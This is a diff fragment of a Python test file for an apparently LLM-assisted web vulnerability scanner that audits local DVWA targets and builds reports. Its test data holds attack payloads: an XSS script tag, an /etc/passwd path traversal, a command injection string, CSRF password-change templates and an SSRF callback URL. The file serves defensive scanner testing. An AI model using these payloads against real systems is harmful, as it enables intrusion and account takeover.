+                "final_url": "http://example.com/fetch?url=http://example.org",
+                "input_points": [{"name": "url", "method": "GET", "url": "http://example.com/fetch?url=http://example.org", "active_testable": True}],
+            }
+        ],
+    }
+
+    audit = AuditorAgent(settings(active_scan=True, llm_payload_advisor=False)).audit(webscan)
+    candidate_categories = {item["category"] for item in audit["findings"] if item["status"] == "疑似漏洞"}
+
+    assert {"ssrf", "stored_xss", "file_upload"} <= candidate_categories
+    assert any(item["details"].get("opt_in_required") == "NOVA_SSRF_CALLBACK_URL" for item in audit["findings"])
+    assert any(item["details"].get("opt_in_required") == "NOVA_STORED_XSS_PROBES=true" for item in audit["findings"])
+    assert any(item["details"].get("opt_in_required") == "NOVA_FILE_UPLOAD_PROBES=true" for item in audit["findings"])
+
+
 def test_auditor_rules_detect_headers_cookies_forms_and_query() -> None:
     webscan = {
         "target": "http://example.com/?q=1",
@@ -702,6 +1577,150 @@ def test_auditor_rules_detect_headers_cookies_forms_and_query() -> None:
     assert audit["summary"]["llm_enabled"] is False
 
 
+def test_auditor_confirms_get_state_change_csrf_form() -> None:
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+        "reachable": True,
+        "headers": {
+            "Content-Security-Policy": "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
+            "X-Frame-Options": "DENY",
+            "X-Content-Type-Options": "nosniff",
+            "Referrer-Policy": "no-referrer",
+        },
+        "cookies": [],
+        "forms": [
+            {
+                "method": "GET",
+                "action": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+                "inputs": [
+                    {"name": "password_new", "type": "password", "value": ""},
+                    {"name": "password_conf", "type": "password", "value": ""},
+                    {"name": "Change", "type": "submit", "value": "Change"},
+                ],
+            }
+        ],
+        "pages": [],
+    }
+
+    audit = AuditorAgent(settings(active_scan=False, llm_payload_advisor=False)).audit(webscan)
+    finding = next(item for item in audit["findings"] if item["category"] == "csrf")
+
+    assert finding["status"] == "确认漏洞"
+    assert finding["title"] == "确认存在 GET 状态变更 CSRF 风险"
+    assert finding["details"]["evidence_type"] == "get_state_change_form"
+    assert audit["summary"]["confirmed"] == 1
+
+
+def test_payload_advisor_adds_confirmed_csrf_poc_templates(monkeypatch) -> None:
+    def fail_if_called(*_args, **_kwargs):
+        raise AssertionError("local CSRF templates should not require LLM calls")
+
+    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fail_if_called)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+        "final_url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+        "forms": [
+            {
+                "method": "GET",
+                "action": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+                "inputs": [
+                    {"name": "password_new", "type": "password", "value": ""},
+                    {"name": "password_conf", "type": "password", "value": ""},
+                    {"name": "Change", "type": "submit", "value": "Change"},
+                ],
+            }
+        ],
+        "pages": [],
+    }
+    findings = [
+        {
+            "id": "NOVA-F-001",
+            "title": "确认存在 GET 状态变更 CSRF 风险",
+            "status": "确认漏洞",
+            "category": "csrf",
+            "url": "http://127.0.0.1/DVWA/vulnerabilities/csrf/",
+            "payloads": ["无 Token 的 GET 状态变更请求"],
+            "details": {
+                "method": "GET",
+                "input_names": ["password_new", "password_conf", "change"],
+                "evidence_type": "get_state_change_form",
+            },
+        }
+    ]
+
+    result = LLMPayloadAdvisor(
+        settings(llm_baseurl="http://llm.local", llm_apikey="k", llm_provider="deepseek", llm_on_local_targets=False)
+    ).generate(webscan, findings)
+
+    allowed = [item for item in result["items"] if item["allowed"] and item["category"] == "csrf"]
+    assert len(allowed) == 2
+    assert all(item["source"] == "local_progression_template" for item in allowed)
+    assert any("password_new=NOVA_CSRF_TEST_PASSWORD" in item["payload"] for item in allowed)
+    assert any("password_conf=NOVA_CSRF_TEST_PASSWORD" in item["payload"] for item in allowed)
+    assert any(item["payload"].startswith("<img src=") for item in allowed)
+
+
+def test_payload_advisor_adds_type_specific_progression_templates(monkeypatch) -> None:
+    def fail_if_called(*_args, **_kwargs):
+        raise AssertionError("local progression templates should not require LLM calls")
+
+    monkeypatch.setattr("backend.helper.llm.client.LLMClient.chat", fail_if_called)
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/",
+        "final_url": "http://127.0.0.1/DVWA/",
+        "pages": [
+            {
+                "input_points": [
+                    {"name": "name", "method": "GET", "url": "http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=hyx"},
+                    {"name": "page", "method": "GET", "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"},
+                    {"name": "ip", "method": "GET", "url": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1"},
+                ]
+            }
+        ],
+    }
+    findings = [
+        {
+            "id": "NOVA-XSS-001",
+            "status": "确认漏洞",
+            "category": "xss",
+            "url": "http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E",
+            "details": {"target_param": "name", "evidence_type": "raw_xss_reflection"},
+            "payloads": ["<script>alert('NOVA_XSS')</script>"],
+        },
+        {
+            "id": "NOVA-LFI-001",
+            "status": "确认漏洞",
+            "category": "lfi",
+            "url": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+            "details": {"target_param": "page", "evidence_type": "file_read_signature"},
+            "payloads": ["../../../../../../etc/passwd"],
+        },
+        {
+            "id": "NOVA-CMD-001",
+            "status": "确认漏洞",
+            "category": "command_injection",
+            "url": "http://127.0.0.1/DVWA/vulnerabilities/exec/?ip=127.0.0.1",
+            "details": {"target_param": "ip", "evidence_type": "command_echo_marker"},
+            "payloads": ["127.0.0.1; echo NOVA_CMD"],
+        },
+    ]
+
+    result = LLMPayloadAdvisor(
+        settings(
+            llm_baseurl="http://llm.local",
+            llm_apikey="k",
+            llm_provider="deepseek",
+            llm_on_local_targets=False,
+            llm_payload_max_per_param=10,
+        )
+    ).generate(webscan, findings)
+
+    allowed = [item for item in result["items"] if item["allowed"]]
+    assert any(item["category"] == "xss" and "svg/onload" in item["payload"] for item in allowed)
+    assert any(item["category"] == "lfi" and "etc/passwd" in item["payload"] for item in allowed)
+    assert any(item["category"] == "command_injection" and "NOVA_CMD_VERIFY" in item["payload"] for item in allowed)
+
+
 def test_auditor_reports_missing_auth_context() -> None:
     webscan = {
         "target": "http://example.com/login.php",
@@ -717,6 +1736,72 @@ def test_auditor_reports_missing_auth_context() -> None:
     audit = AuditorAgent(settings()).audit(webscan)
 
     assert any(item["id"] == "NOVA-AUTH-000" for item in audit["findings"])
+
+
+def test_auditor_reports_login_page_without_credentials() -> None:
+    webscan = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+        "final_url": "http://127.0.0.1/DVWA/login.php",
+        "reachable": True,
+        "title": "Login :: Damn Vulnerable Web Application (DVWA)",
+        "headers": {},
+        "cookies": [],
+        "forms": [],
+        "pages": [],
+        "auth": {"configured": False},
+        "target_probe": {"auth_required": False},
+    }
+
+    audit = AuditorAgent(settings(llm_payload_advisor=False)).audit(webscan)
+
+    assert any(item["id"] == "NOVA-AUTH-002" for item in audit["findings"])
+
+
+def test_report_shows_auth_notice_when_confirmed_filter_is_enabled(tmp_path: Path, monkeypatch) -> None:
+    monkeypatch.delenv("NOVA_REPORT_CONFIRMED_ONLY", raising=False)
+    audit = {
+        "target": "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+        "audited_at": "2026-05-22T00:00:00+00:00",
+        "findings": [
+            {
+                "id": "NOVA-AUTH-002",
+                "title": "当前扫描停留在登录页，未进入目标业务页面",
+                "severity": "Info",
+                "confidence": "High",
+                "status": "扫描提示",
+                "category": "authentication",
+                "url": "http://127.0.0.1/DVWA/login.php",
+                "evidence": "扫描结果显示最终页面是登录页。",
+                "payloads": [],
+                "request_response": {},
+                "details": {"evidence_type": "login_page"},
+                "recommendation": "重新获取有效登录态 Cookie。",
+                "llm_analysis": "",
+            }
+        ],
+        "llm_payload_advice": [],
+        "llm_payload_summary": {"enabled": False, "status": "disabled", "message": "", "report_only": True},
+    }
+
+    report, _, markdown_path = PayloadAgent().build_report(
+        "http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php",
+        {"status_code": 200, "title": "Login :: Damn Vulnerable Web Application (DVWA)"},
+        audit,
+        tmp_path,
+        target_probe={
+            "reachable": True,
+            "final_url": "http://127.0.0.1/DVWA/login.php",
+            "auth_required": True,
+            "auth_type_guess": "login_page",
+            "auth": {},
+            "redirect_chain": [],
+            "probe_errors": [],
+        },
+    )
+
+    markdown = markdown_path.read_text(encoding="utf-8-sig")
+    assert report["summary"]["total_findings"] == 1
+    assert "当前扫描停留在登录页" in markdown
 
 
 def test_llm_payload_safety_filter_allows_blind_pair_and_blocks_dangerous_payloads() -> None:
@@ -1126,6 +2211,77 @@ def test_report_hides_non_confirmed_findings_by_default(tmp_path: Path, monkeypa
     assert report["summary"]["total_findings"] == 1
     assert report["summary"]["raw_total_findings"] == 2
     assert "确认存在 SQL 注入错误回显" in markdown
+    assert "缺少 Content-Security-Policy" not in markdown
+
+
+def test_report_shows_verifiable_candidates_by_default(tmp_path: Path, monkeypatch) -> None:
+    monkeypatch.delenv("NOVA_REPORT_CONFIRMED_ONLY", raising=False)
+    monkeypatch.delenv("NOVA_REPORT_VERIFIABLE_CANDIDATES", raising=False)
+    audit = {
+        "target": "http://example.com/fetch?url=http://example.org",
+        "audited_at": "2026-05-22T00:00:00+00:00",
+        "findings": [
+            {
+                "id": "NOVA-H-001",
+                "title": "缺少 Content-Security-Policy 响应头",
+                "severity": "Medium",
+                "confidence": "High",
+                "status": "配置建议",
+                "category": "security_header",
+                "url": "http://example.com/",
+                "evidence": "header missing",
+                "payloads": [],
+                "request_response": {},
+                "recommendation": "fix header",
+                "llm_analysis": "",
+            },
+            {
+                "id": "NOVA-SSRF-001",
+                "title": "疑似 SSRF URL 输入点",
+                "severity": "Medium",
+                "confidence": "Medium",
+                "status": "疑似漏洞",
+                "category": "ssrf",
+                "url": "http://example.com/fetch?url=http://example.org",
+                "evidence": "参数 url 表现为服务端请求 URL 的候选点。",
+                "payloads": ["配置 NOVA_SSRF_CALLBACK_URL 后使用专属 callback URL 验证"],
+                "request_response": {},
+                "details": {"target_param": "url", "opt_in_required": "NOVA_SSRF_CALLBACK_URL"},
+                "recommendation": "validate outbound URL",
+                "llm_analysis": "",
+            },
+        ],
+        "llm_payload_advice": [
+            {
+                "input_point": "http://example.com/fetch?url=http://example.org",
+                "category": "ssrf",
+                "target_param": "url",
+                "payload": "https://callback.example.test/nova",
+                "allowed": True,
+                "filter_reason": "通过本地非破坏性 Safety Filter",
+                "purpose": "配置 callback 后手工验证 SSRF",
+                "expected_signal": "callback 命中",
+                "risk_note": "仅报告参考",
+                "source": "llm",
+            }
+        ],
+        "llm_payload_summary": {"enabled": True, "status": "ok", "message": "ok", "report_only": True},
+    }
+
+    report, _, markdown_path = PayloadAgent().build_report(
+        "http://example.com/fetch?url=http://example.org",
+        {"status_code": 200, "title": "Mock"},
+        audit,
+        tmp_path,
+        target_probe={"reachable": True, "auth": {}, "redirect_chain": [], "probe_errors": []},
+    )
+
+    markdown = markdown_path.read_text(encoding="utf-8-sig")
+    assert report["summary"]["total_findings"] == 1
+    assert report["summary"]["report_verifiable_candidates"] is True
+    assert "疑似 SSRF URL 输入点" in markdown
+    assert "LLM 后续 payload" in markdown
+    assert "callback.example.test" in markdown
     assert "缺少 Content-Security-Policy" not in markdown
 
 
